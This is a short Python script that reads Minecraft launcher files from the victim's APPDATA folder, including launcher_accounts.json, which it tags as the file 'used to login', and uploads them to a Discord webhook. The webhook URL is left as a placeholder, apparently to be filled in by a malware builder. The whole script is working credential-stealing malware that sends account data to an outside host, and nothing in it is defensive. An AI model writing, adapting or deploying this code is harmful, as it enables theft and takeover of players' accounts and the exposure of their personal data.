import os, json
from discord_webhook import DiscordWebhook
#Imports
webhook = DiscordWebhook(url='%webhook%')

apd = os.getenv('APPDATA')
mc = apd + "\.minecraft\\"

files = ['launcher_accounts.json', 'usercache.json', 'launcher_profiles.json', 'launcher_log.txt']
for x in files:
    with open(mc + x, "rb") as f:
        if (x == 'launcher_accounts.json'):
            x = f"USED_TO_LOGIN-{x}"
        webhook.add_file(file=f.read(), filename=x)

response = webhook.execute()
